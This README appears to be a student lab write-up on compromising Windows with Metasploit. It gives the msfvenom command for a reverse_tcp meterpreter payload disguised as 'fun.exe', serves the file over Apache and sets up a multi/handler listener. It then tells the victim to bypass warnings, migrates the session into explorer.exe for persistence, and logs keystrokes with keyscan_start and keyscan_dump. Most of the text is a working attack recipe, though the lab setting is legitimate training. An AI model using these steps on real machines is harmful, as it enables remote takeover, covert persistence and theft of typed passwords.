# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

## OUTPUT:
![image](https://github.com/Shobika187/Compromising-windows-using-Metasploit/assets/94508142/c828dc3b-0950-4b85-a0d9-eb07782e90ef)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe.
## OUTPUT:
![image](https://github.com/Shobika187/Compromising-windows-using-Metasploit/assets/94508142/79999a69-ac6e-404c-b2a5-e2175a49a698)
the fun.exe into the apache /var/www/html folder

![image](https://github.com/Shobika187/Compromising-windows-using-Metasploit/assets/94508142/83f50d9d-f2f6-49ae-ba7d-8fb2594795c3)
Start apache server sudo systemctl apache2 start
![image](https://github.com/Shobika187/Compromising-windows-using-Metasploit/assets/94508142/b7fb41ee-baa5-4874-9523-2a3b95bcd198)
Check the status of apache2
![image](https://github.com/Shobika187/Compromising-windows-using-Metasploit/assets/94508142/647113b2-98db-4de7-859b-04da1361dd50)
Invoke msfconsole:

## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![image](https://github.com/Shobika187/Compromising-windows-using-Metasploit/assets/94508142/3f078903-42c9-46f2-99ed-2baab366bc27)
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/Shobika187/Compromising-windows-using-Metasploit/assets/94508142/6e4cd44a-79e7-47a3-ab0d-439b2f892c9d)
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/Shobika187/Compromising-windows-using-Metasploit/assets/94508142/bbdc1d60-c3e0-42dc-bb13-fac3f56b9dc8)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted.
![image](https://github.com/Shobika187/Compromising-windows-using-Metasploit/assets/94508142/27926ddb-ba4b-4a9b-a5dd-a6820006351f)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/Shobika187/Compromising-windows-using-Metasploit/assets/94508142/8845cb91-bb77-4c41-8e61-d66c74a93155)
keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/Shobika187/Compromising-windows-using-Metasploit/assets/94508142/00a6fe1d-b702-407b-8ae7-c3acc15bfa6f)



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
